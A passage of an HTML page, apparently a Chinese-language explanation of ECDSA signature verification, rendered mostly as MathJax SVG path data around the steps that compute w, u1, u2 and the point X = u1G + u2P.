46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z\"/></g></g></g></svg></mjx-container></span>、消息 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.025ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.986ex\" height=\"1.025ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -442 878 453\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D45A\" d=\"M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g></g></g></svg></mjx-container></span> 和签名 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"4.848ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 2142.7 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mo\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(389,0)\"><path data-c=\"1D45F\" d=\"M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(840,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1284.7,0)\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1753.7,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g></g></g></svg></mjx-container></span> 计算：</p>\n<ol type=\"1\">\n<li><span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.186ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"14.819ex\" height=\"2.072ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -833.9 6549.8 915.9\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D464\" d=\"M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(993.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"msup\" transform=\"translate(2049.6,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(502,363) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mo\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(778,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g></g><g data-mml-node=\"mo\" transform=\"translate(3783,0)\"><path data-c=\"6D\" d=\"M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z\"/><path data-c=\"6F\" d=\"M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z\" transform=\"translate(833,0)\"/><path data-c=\"64\" d=\"M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z\" transform=\"translate(1333,0)\"/></g><g data-mml-node=\"mi\" transform=\"translate(5949.8,0)\"><path data-c=\"1D45B\" d=\"M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z\"/></g></g></g></svg></mjx-container></span>；</li>\n<li><span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"12.674ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 5602.1 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D462\" d=\"M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(605,-150) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(1286.3,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(2342.1,0)\"><path data-c=\"1D43B\" d=\"M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 219 683Q260 681 355 681Q389 681 418 681T463 682T483 682Q499 682 499 672Q499 670 497 658Q492 641 487 638H485Q483 638 480 638T473 638T464 637T455 637Q416 636 405 634T387 623Q384 619 355 500Q348 474 340 442T328 395L324 380Q324 378 469 378H614L615 381Q615 384 646 504Q674 619 674 627T617 637Q594 637 587 639T580 648Q580 650 582 660Q586 677 588 679T604 682Q609 682 646 681T740 680Q802 680 835 681T871 682Q888 682 888 672Q888 645 876 638H874Q872 638 869 638T862 638T853 637T844 637Q805 636 794 634T776 623Q773 618 704 340T634 58Q634 51 638 51Q646 48 692 46H723Q729 38 729 37T726 19Q722 6 716 0H701Q664 2 567 2Q533 2 504 2T458 2T437 1Q420 1 420 10Q420 15 423 24Q428 43 433 45Q437 46 448 46H454Q481 46 514 49Q520 50 522 50T528 55T534 64T540 82T547 110T558 153Q565 181 569 198Q602 330 602 331T457 332H312L279 197Q245 63 245 58Q245 51 253 49T303 46H334Q340 38 340 37T337 19Q333 6 327 0H312Q275 2 178 2Q144 2 115 2T69 2T48 1Q31 1 31 10Q31 12 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(3230.1,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(3619.1,0)\"><path data-c=\"1D45A\" d=\"M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(4497.1,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(4886.1,0)\"><path data-c=\"1D464\" d=\"M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z\"/></g></g></g></svg></mjx-container></span>, <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.339ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"7.939ex\" height=\"1.658ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -583 3509.1 733\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D462\" d=\"M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(605,-150) scale(0.707)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(1286.3,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(2342.1,0)\"><path data-c=\"1D45F\" d=\"M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(2793.1,0)\"><path data-c=\"1D464\" d=\"M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z\"/></g></g></g></svg></mjx-container></span>；</li>\n<li><span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.339ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"15.751ex\" height=\"1.934ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -705 6962.1 855\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D44B\" d=\"M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1129.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(2185.6,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D462\" d=\"M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(605,-150) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g><g data-mml-node=\"mi\" transform=\"translate(3194.1,0)\"><path data-c=\"1D43A\" d=\"M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(4202.3,0)\"><path data-c=\"2B\" d=\"M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(5202.6,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D462\" d=\"M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(605,-150) scale(0.707)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g></g><g data-mml-node=\"mi\" transform=\"translate(6211.1,0)\"><path data-c=\"1D443\" d=\"M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z\"/></g></g></g></svg></mjx-container></span>，验证 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.357ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"13.902ex\" height=\"1.927ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -694 6144.6 851.8\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D44B\" d=\"M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(861,-150) scale(0.707)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 